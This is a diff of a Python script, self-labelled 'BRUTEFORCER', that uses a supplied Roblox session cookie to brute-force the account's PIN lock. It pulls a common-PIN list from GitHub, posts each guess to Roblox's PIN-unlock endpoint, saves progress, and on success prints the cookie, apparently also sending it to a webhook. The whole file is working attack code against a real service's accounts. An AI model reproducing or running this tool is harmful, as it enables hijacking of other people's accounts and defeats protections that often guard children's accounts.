@@ -152,14 +152,14 @@ class crack:
     cprint(" BRUTEFORCER ", "magenta", end="")
     print("] ", end="")
     for char in 'Cracking the pin....':
-      time.sleep(0.1)
+      time.sleep(0.07)
       cprint(char, 'magenta', end='', flush=True)
     print("")
     print("[", end="")
     cprint(" BRUTEFORCER ", "magenta", end="")
     print("] ", end="")
     for char in 'Leave this running for about around 5-29 days':
-      time.sleep(0.1)
+      time.sleep(0.07)
       cprint(char, 'magenta', end='', flush=True)
     cookies = {
     '.ROBLOSECURITY': cookie
@@ -167,39 +167,40 @@ class crack:
     userid = requests.get("https://users.roblox.com/v1/users/authenticated",cookies=cookies).json()['id']
     # --({ Try all the most common pins }) -- #
     clear()
-    while True:
-      headers = {
-      'X-CSRF-TOKEN': getXsrf(cookie),
-      }
-      # --({ Start from progress saved }) -- #
-      if continueProgress:
-        try:
-          startingLine = json.load(open("progress.json", "r"))[str(userid)]
-        except:
-          print("[", end="")
-          cprint(" ERRORS ", "red", end="")
-          print("] " , end="")
-          cprint(f"There is no progress saved inside for this account progress.json", 'red')
-          time.sleep(2)
-          clear()
-          crack.check()
-        pins = [pin[0:pin.index(",")] for pin in requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv").text.splitlines()][startingLine:9998]
-      else:
-        startingLine = 0
-        pins = [pin[0:pin.index(",")] for pin in requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv").text.splitlines()]
-      # --({ Update progress }) -- #
-      for line, pin in enumerate(pins):
+    time.sleep(1)
+    headers = {
+    'X-CSRF-TOKEN': getXsrf(cookie),
+    }
+    # --({ Start from progress saved }) -- #
+    if continueProgress:
+      try:
+        startingLine = json.load(open("progress.json", "r"))[str(userid)]
+      except:
         print("[", end="")
-        cprint(" BRUTEFORCER ", "magenta", end="")
+        cprint(" ERRORS ", "red", end="")
         print("] " , end="")
-        cprint(f"Trying {pin}...", "magenta")
-        progress = json.load(open("progress.json", "r"))
-        with open("progress.json", "w+") as f:
-          progress[str(userid)] = int(line+startingLine)
-          json.dump(progress, f, indent=1)
-        response = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies=cookies).json()
-        # --({ Check if the pin was found }) -- #
-        try:
+        cprint(f"There is no progress saved inside for this account progress.json", 'red')
+        time.sleep(2)
+        clear()
+        crack.check()
+      pins = [pin[0:pin.index(",")] for pin in requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv").text.splitlines()][startingLine:9998]
+    else:
+      startingLine = 0
+      pins = [pin[0:pin.index(",")] for pin in requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv").text.splitlines()]
+    # --({ Update progress }) -- #
+    for line, pin in enumerate(pins):
+      print("[", end="")
+      cprint(" BRUTEFORCER ", "magenta", end="")
+      print("] " , end="")
+      cprint(f"Trying {pin}...", "magenta")
+      progress = json.load(open("progress.json", "r"))
+      with open("progress.json", "w+") as f:
+        progress[str(userid)] = int(line+startingLine)
+        json.dump(progress, f, indent=1)
+      response = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies=cookies).json()
+      pin = pins[line]
+      # --({ Check if the pin was found }) -- #
+      try:
           if "unlockedUntil" in str(response):
             cprint("Cookie:", 'blue')
             print(cookie)
@@ -213,7 +214,8 @@ class crack:
               cprint("ERROR", end="")
               print("] " , end="")
               cprint('Invalid Webhook', 'red')
-            break
+            while True:
+              pass
           if response['errors'][0]['code'] == 4:
             print("[", end="")
             cprint(" BRUTEFORCER ", "magenta", end="")
@@ -231,7 +233,6 @@ class crack:
             print("] " , end="")
             cprint("Error found. Invalid Cookie. Re-enter the cookie and try again", "red")
             time.sleep(5)
-            clear()
             crack.start()
             break
           elif response['errors'][0]['message'] == 'Token Validation Failed':
@@ -239,14 +240,16 @@ class crack:
             cprint(" ERROR ", "red", end="")
             print("] " , end="")
             cprint("Error found. Invalid x-csrf token. The program failed to fetch the x-csrf token. Recheck the cookie and the roblox api endpoint. https://auth.roblox.com/v1/account/pin/unlock", "red")
+            time.sleep(5)
+            crack.start()
             break
-        except Exception as e:
-          print(f"A error has occured{e}")
-      else:
-        print("[", end="")
-        cprint(" ERROR ", "red", end="")
-        print("] " , end="")
-        cprint("Invalid Cookie", 'red')
+      except Exception as e:
+        print(f"A error has occured{e}")
+    else:
+      print("[", end="")
+      cprint(" ERROR ", "red", end="")
+      print("] " , end="")
+      cprint("Invalid Cookie", 'red')
         
         
 
